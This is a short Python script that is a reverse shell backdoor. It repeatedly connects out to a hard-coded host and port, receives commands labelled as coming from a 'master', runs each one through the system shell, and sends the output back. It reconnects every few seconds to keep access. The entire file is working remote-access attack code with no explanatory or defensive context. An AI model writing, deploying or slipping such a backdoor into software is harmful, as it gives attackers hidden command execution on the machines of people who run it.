#! /usr/bin/env python

import socket
import subprocess
import sys
import time

HOST = '127.0.0.1'   
PORT = 22

def connect((host, port)):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s

def run_shell_cmd(s):
        data = s.recv(1024)

        if data == "quit\n":
                s.close()
                sys.exit(0)
        elif len(data)==0:
                return True
        else:
                proc = subprocess.Popen(data, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
                
                stdout_value = proc.stdout.read() + proc.stderr.read()
                
                s.send(stdout_value)
                return False

def main():
        while True:
                socket_alive=True
                try:
                        s=connect((HOST,PORT))
                        time.sleep(2)
                        s.send('Test')
                        while socket_alive:
                                commands_from_master=run_shell_cmd(s)
                        s.close()
                except socket.error:
                        pass
                time.sleep(5)

if __name__ == "__main__":
        sys.exit(main())
